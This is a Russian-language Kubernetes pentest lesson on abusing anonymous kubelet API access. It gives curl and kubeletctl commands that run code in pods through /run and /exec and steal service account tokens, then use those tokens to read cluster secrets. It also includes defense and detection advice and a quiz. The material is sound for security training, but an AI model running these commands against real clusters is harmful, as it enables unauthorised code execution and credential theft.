---
id: cloud-k8s-kubelet
title: "Kubelet API 10250/10255: анонимный доступ и RCE"
category: cloud
parent: cloud-k8s-deep
difficulty: expert
order: 1
tags: [cloud, kubernetes, kubelet, 10250, rce, exec, anonymous]
prerequisites: [cloud-k8s-deep, cloud-kubernetes-rbac]
useful_for:
  - "Пентест кластеров Kubernetes"
  - "RCE через kubelet"
  - "Чтение подов и секретов без API-сервера"
estimated_minutes: 50
summary: "Как устроен kubelet API, какие порты он слушает, чем опасен анонимный доступ и как через /exec, /run и /logs получить выполнение команд в подах и прочитать их данные."
---

## Зачем этот урок

Kubelet — это агент на каждом узле Kubernetes. Он слушает API на порту **10250** (и исторически **10255** read-only), через который можно перечислять поды, читать логи, выполнять команды и пробрасывать порты. Если kubelet доступен и аутентификация слабая (или анонимный доступ включён), вы получаете **RCE внутри подов без доступа к kube-apiserver**. Это одна из самых частых находок в пентесте кластеров: kubelet часто «выглядывает» наружу, а его API-токен не всегда проверяется. В этом уроке — устройство kubelet API, анонимный доступ, `kubeletctl` и практические цепочки к секретам и узлу.

## Как устроен kubelet API

Kubelet слушает несколько портов:

| Порт | Назначение | Аутентификация |
|------|-----------|----------------|
| 10250 | Основной API (read-write) | TLS, client cert или webhook |
| 10255 | Read-only (устаревший) | Обычно без аутентификации |
| 10248 | /healthz | локально |
| 4194 | cAdvisor (устаревший) | обычно нет |

Основные эндпоинты 10250:

- `GET /pods` — список подов с полной спецификацией (включая env, volumes, service account).
- `GET /runningpods/` — запущенные поды.
- `GET /metrics`, `GET /stats/summary` — метрики.
- `GET /logs/` — логи.
- `POST /exec/<namespace>/<pod>/<container>` — выполнение команды (как `kubectl exec`).
- `POST /run/<namespace>/<pod>/<container>` — запуск команды (неинтерактивно).
- `POST /portForward/...` — port forwarding.
- `GET /configz` — конфигурация kubelet.
- `GET /healthz` — здоровье.

Параметры аутентификации kubelet:

- `--anonymous-auth=true` — разрешает неаутентифицированные запросы (в старых версиях по умолчанию true; в новых — false, но встречается).
- `--authorization-mode=Webhook` — делегирует авторизацию в kube-apiserver (SubjectAccessReview).
- `--client-ca-file` — CA для клиентских сертификатов.
- `--read-only-port=10255` — включает read-only порт.

Слабости: анонимный доступ на 10250; read-only порт 10255; webhook-авторизация, но анонимный principal `system:anonymous` с правами; отсутствие NetworkPolicy, позволяющее достучаться до kubelet с любого пода.

## Инструменты и команды

`curl` (базовый):

```bash
# Список подов (без аутентификации, если anonymous разрешён)
curl -sk https://<node-ip>:10250/pods | jq '.items[].metadata | {ns:.namespace,name:.name}'

# Read-only порт 10255
curl -s http://<node-ip>:10255/pods | jq '.items[].metadata.name'
curl -s http://<node-ip>:10255/metrics | head

# Конфигурация kubelet
curl -sk https://<node-ip>:10250/configz | jq '.kubeletconfig | {anonymous:.authentication.anonymous.enabled,authz:.authorization.mode}'
```

`kubeletctl` (удобный инструмент):

```bash
# Скан узлов и подов
kubeletctl scan --cidr 10.0.0.0/24
kubeletctl pods -s <node-ip>
kubeletctl scan token -s <node-ip>

# Выполнить команду в поде
kubeletctl exec "id" -p <pod> -c <container> -s <node-ip>

# Прочитать service account token из пода
kubeletctl exec "cat /var/run/secrets/kubernetes.io/serviceaccount/token" \
  -p <pod> -c <container> -s <node-ip>
```

Через API-сервер (для сравнения) `kubectl exec` требует прав на `pods/exec`; kubelet даёт тот же эффект в обход RBAC.

## Разобранный пример: от скана до RCE и токена

Сценарий: вы внутри кластера (под с ограниченными правами) и ищете kubelet.

Шаг 1 — сканируем подсеть на 10250:

```bash
for ip in 10.0.1.11 10.0.1.12 10.0.1.13; do
  code=$(curl -sk -o /dev/null -w "%{http_code}" https://$ip:10250/pods)
  echo "$ip -> $code"
done
# 10.0.1.11 -> 403
# 10.0.1.12 -> 200
```

Шаг 2 — узел 10.0.1.12 отдаёт `/pods` анонимно. Смотрим поды и их namespace:

```bash
curl -sk https://10.0.1.12:10250/pods | jq -r '.items[] | "\(.metadata.namespace)/\(.metadata.name)"'
# kube-system/coredns-abc
# default/web-xyz
# monitoring/prometheus-0
```

Шаг 3 — выполняем команду в поде (проверяем анонимный exec). Некоторые kubelet разрешают exec анонимно, некоторые — нет:

```bash
curl -sk -X POST "https://10.0.1.12:10250/run/default/web-xyz/web" \
  -d "cmd=id"
# uid=0(root) gid=0(root) groups=0(root)
```

Шаг 4 — читаем service account token из пода. Это ключ к API-серверу с правами SA:

```bash
curl -sk -X POST "https://10.0.1.12:10250/run/default/web-xyz/web" \
  -d "cmd=cat /var/run/secrets/kubernetes.io/serviceaccount/token"
```

Шаг 5 — используем токен против API-сервера:

```bash
TOKEN=<token>
curl -sk -H "Authorization: Bearer $TOKEN" https://kubernetes.default.svc/api/v1/namespaces/default/secrets
```

Шаг 6 — если SA привилегированный (например, в `kube-system` или с `cluster-admin`), вы получаете контроль над кластером. Если узел под управлением kubelet с анонимным доступом и под имеет `hostPath` или `privileged`, можно попытаться выйти на сам узел (`cloud-kubernetes-escape`).

## Варианты атак и обходы

- **Anonymous auth на 10250.** `GET /pods` и иногда `/run` работают без токена.
- **Read-only порт 10255.** Отдаёт поды и метрики; утечка структуры и env.
- **`/configz`.** Раскрывает конфигурацию kubelet, включая режим авторизации и cluster-dns.
- **Webhook + anonymous.** Если webhook-авторизация пропускает `system:anonymous`, эффект тот же.
- **`/exec` в привилегированный под.** Если под `privileged` или с `hostPath`, exec даёт выход на узел.
- **Kubelet client cert.** Если у вас есть client cert с правами (например, украденный), вы можете обращаться к любому kubelet кластера.
- **Node `system:node` роль.** Иногда под получает права узла; проверьте.
- **Port forwarding.** `/portForward` позволяет пробросить порт к внутренним сервисам — pivot.
- **Cloud metadata.** Через exec читаем instance metadata (IMDS) — часто даёт node IAM-роль (`cloud-metadata-ssrf`).

## Частые ошибки и подводные камни

- **Считать 10250 всегда анонимным.** В новых кластерах anonymous выключен; проверяйте `/configz` и фактический ответ.
- **Игнорировать 10255.** Устаревший порт часто забыт и открыт.
- **Путать kubelet и kube-apiserver.** Это разные API; kubelet обходит RBAC API-сервера.
- **Ошибка с TLS.** kubelet использует самоподписанный сертификат — `curl -k`.
- **Не проверять webhook.** `--authorization-mode=Webhook` может всё равно пускать анонима.
- **Забывать про NetworkPolicy.** Если политика запрещает доступ к kubelet, вы не достучитесь с пода — ищите узел, где политики нет.

## Защита и детект

- **`--anonymous-auth=false`** на kubelet (по умолчанию в новых версиях).
- **`--authorization-mode=Webhook`** и корректная RBAC для `system:node`.
- **Отключите read-only порт** (`--read-only-port=0`).
- **NetworkPolicy**, запрещающая доступ к kubelet (10250) с подов.
- **Ограничьте доступ к узлам** по сети (security groups/firewall).
- **Детект.** Kubelet logs (запросы к `/exec`, `/run`), audit logs API-сервера для `pods/exec`, необычные обращения к 10250 с подов. GuardDuty для EKS (`PrivilegeEscalation:Kubernetes/...`). Falco может детектить exec в подах.
- **Обновляйте Kubernetes.** Старые версии имеют более слабые дефолты.

## Kubelet в managed-кластерах: EKS, AKS, GKE

В managed-кластерах kubelet обычно **не выставлен в интернет**, но это не значит, что он недостижим. Модель доступа различается:

- **EKS.** Узлы — EC2-инстансы в ваших подсетях. Kubelet слушает на 10250, доступен с других узлов и подов в VPC (если security group разрешает). EKS использует `aws-iam-authenticator` для API-сервера; для kubelet — client cert. Часто SG открывает 10250 между узлами, и под с доступом к узловой сети может достучаться до kubelet.
- **GKE.** Узлы — GCE-инстансы. Kubelet защищён сетевыми политиками и firewall rules GCP; доступ к 10250 обычно ограничен. Но GKE metadata server и node SA — отдельная поверхность.
- **AKS.** Узлы — VMSS. Kubelet на 10250, доступен внутри VNet. Azure NSG может разрешать трафик между узлами.

Практика: в managed-кластере сначала проверьте достижимость kubelet **изнутри** (из пода или с другого узла), а не снаружи. Если у вас есть exec в под с `hostNetwork` или доступ к узловой сети — 10250 часто открыт. Также проверьте `kubeletctl scan --cidr <pod-cidr>` — он найдёт узлы с доступным API.

## Kubelet и node authorizer: как kubelet аутентифицируется

Kubelet в кластере предъявляет **client certificate** с identity `system:node:<nodeName>` в группе `system:nodes`. API-сервер авторизует такие запросы через **Node authorizer**, который разрешает узлу читать только связанные с ним ресурсы (секреты, поды, configmaps своего узла). Это ограничение важно понимать: kubelet может читать **секреты подов на своём узле**, но не любые. Если злоумышленник получил kubelet client cert (например, с узла), он действует как этот узел и читает секреты, привязанные к нему.

Отсюда практические цепочки:

- Exec через kubelet → чтение SA-токена пода → доступ к API-серверу с правами SA.
- Компромисс узла → kubelet client cert → чтение секретов узла.
- Kubelet с анонимным доступом → обход Node authorizer (запросы не от имени узла, а анонимные; если авторизация разрешает, вы читаете больше).

Проверка режима авторизации через `/configz` (если доступен) показывает, как именно kubelet принимает решения, — это первый шаг к пониманию, что вам доступно.

## Что дальше / решение

Kubelet — это обход RBAC и частая точка входа в кластер. Проверьте 10250 и 10255 на всех узлах, `/configz` для режима авторизации, затем `/pods`, `/run`, `/exec`. Получив exec, сразу забирайте service account token и проверяйте его права через API-сервер. Если под привилегированный — выходите на узел. Если узел в облаке — читайте IMDS и захватывайте node IAM-роль. Записывайте найденные узлы с анонимным доступом как отдельные находки и указывайте, какие поды/токены получены.

## Квиз

```quiz
- question: "Какой порт kubelet обычно даёт read-only доступ без аутентификации?"
  options:
    - "10255"
    - "10250"
    - "6443"
    - "2379"
  answer: 0
  explanation: "10255 — устаревший read-only порт, часто открыт без аутентификации."
- question: "Что даёт эндпоинт /run на kubelet?"
  options:
    - "Выполнение команды в поде в обход RBAC API-сервера"
    - "Только чтение логов"
    - "Только метрики"
    - "Создание подов"
  answer: 0
  explanation: "/run исполняет команду в контейнере, как kubectl exec, но без прав API-сервера."
- question: "Какой файл внутри пода даёт доступ к API-серверу?"
  options:
    - "/var/run/secrets/kubernetes.io/serviceaccount/token"
    - "/etc/passwd"
    - "/var/log/syslog"
    - "/root/.kube/config"
  answer: 0
  explanation: "Service account token монтируется в под и используется для API-сервера."
- question: "Какая опция kubelet включает неаутентифицированный доступ?"
  options:
    - "--anonymous-auth=true"
    - "--read-only-port=10255"
    - "--client-ca-file"
    - "--authorization-mode=Webhook"
  answer: 0
  explanation: "anonymous-auth разрешает запросы без аутентификации."
```

## Где пригодится

- **Пентест:** кластеры Kubernetes и managed-кластеры.
- **Red team:** обход RBAC и RCE в подах.
- **CTF:** задачи Kubernetes.
- **Сертификация:** CKS.
